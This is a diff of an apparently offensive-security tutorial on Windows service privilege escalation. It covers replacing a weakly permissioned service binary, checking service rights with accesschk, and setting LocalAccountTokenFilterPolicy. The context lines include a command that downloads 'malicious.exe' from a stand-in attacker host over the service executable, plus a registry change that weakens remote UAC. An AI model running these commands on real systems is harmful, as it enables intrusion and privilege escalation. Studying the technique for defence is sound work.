@@ -73,9 +73,9 @@ Thanks to the wrong permission the attacker can replace the old executable by re
 # DOWNLOAD THE MALICIOUS EXECUTABLE
 > iwr http://<KALI_IP>/malicious.exe -Outfile "C:\Program Files\AniService\ani.exe"
 ```
-Once the binary is replaced you have to restart the service, to check if this is possible a tool of the suite sysinternal can help, [♥accesschk.exe](https://download.sysinternals.com/files/AccessChk.zip) is a tool that allows adminsys to quickly check what type of access users or specific groups have to resources, including files, directories, registry keys, global objects and Windows services.
+Once the binary is replaced you have to restart the service, to check if this is possible a tool of the suite sysinternal can help, [accesschk.exe](https://download.sysinternals.com/files/AccessChk.zip) is a tool that allows adminsys to quickly check what type of access users or specific groups have to resources, including files, directories, registry keys, global objects and Windows services.
 ```bash
-./accesschk64.exe /accepteula -ucqv <SERVICE_NAME>
+> ./accesschk64.exe /accepteula -ucqv <SERVICE_NAME>
 
 Copyright (C) 2006-2022 Mark Russinovich
 Sysinternals - www.sysinternals.com
@@ -121,3 +121,8 @@ A small nuance when adding a local user: there is a registry key named **LocalAc
 ```
 > reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v LocalAccountTokenFilterPolicy /t Reg_DWORD /d 1
 ```
+
+#### Ressources :
+[https://kb.cybertecsecurity.com/knowledge/localaccounttokenfilterpolicy](https://kb.cybertecsecurity.com/knowledge/localaccounttokenfilterpolicy)
+
+[https://offsec.blog/hidden-danger-how-to-identify-and-mitigate-insecure-windows-services/](https://offsec.blog/hidden-danger-how-to-identify-and-mitigate-insecure-windows-services/)
